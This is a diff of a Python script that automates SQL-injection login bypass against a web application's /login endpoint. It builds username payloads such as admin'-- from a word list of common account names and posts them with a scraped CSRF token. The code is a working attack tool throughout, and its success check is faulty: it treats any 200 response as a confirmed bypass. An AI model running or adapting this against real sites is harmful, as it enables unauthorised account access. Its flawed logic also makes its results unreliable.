@@ -5,24 +5,6 @@ from bs4 import BeautifulSoup
 from utils.auxiliary import *
 from utils.files import *
 
-# Remake using files
-payloads = [
-    "admin'--",
-    "admin'#",
-    "administrator'--",
-    "administrator'#"
-]
-
-names = [
-    "admin",
-    "administrator",
-    "root",
-    "guest",
-    "user",
-    "test",
-    "default",
-    "demo"
-]
 
 log = Auxiliary(__name__)
 log.set_config()
@@ -40,26 +22,32 @@ def get_csrf_token(url, s):
 
 
 def try_login_username_sqli(url, s, csrf_token):
-    for pld in payloads:
-        data = {
-            "csrf": csrf_token,
-            "username": pld,
-            "password": "doesNotMatter"
-        }
-        log.logger.info(
-            f"{BLUE}[*]{RESET} Trying login username SQLi on "
-            f"endpoint {url + '/login'} with {data}")
-        r = s.post(url=url + "/login", data=data)
-        if r.status_code == 200:
-            if "Logout" or "Log out" in r.text:
-                log.logger.info(
-                    f"{GREEN}[+]{RESET} Found logout on the page. Confirmed "
-                    f"login SQLi with {data.get('username')}")
-                return pld
+    names = File("names.txt")
+    for name in names.file:
+        name = name[:-1]
+        for comment in ["'--", "'%23"]:
+            pld = name + comment
+            data = {
+                "csrf": csrf_token,
+                "username": pld,
+                "password": "doesNotMatter"
+            }
+            log.logger.info(
+                f"{BLUE}[*]{RESET} Trying login username SQLi on "
+                f"endpoint {url + '/login'} with {data}")
+            r = s.post(url=url + "/login", data=data)
+            if r.status_code == 200:
+                if "Logout" or "Log out" in r.text:
+                    log.logger.info(
+                        f"{GREEN}[+]{RESET} Found logout on the page. "
+                        f"Confirmed login SQLi with {data.get('username')}")
+                    return pld
 
 
 def try_login_password_sqli(url, s, csrf_token):
-    for name in names:
+    names = File("names.txt")
+    for name in names.file:
+        name = name[:-1]
         data = {
             "csrf": csrf_token,
             "username": name,
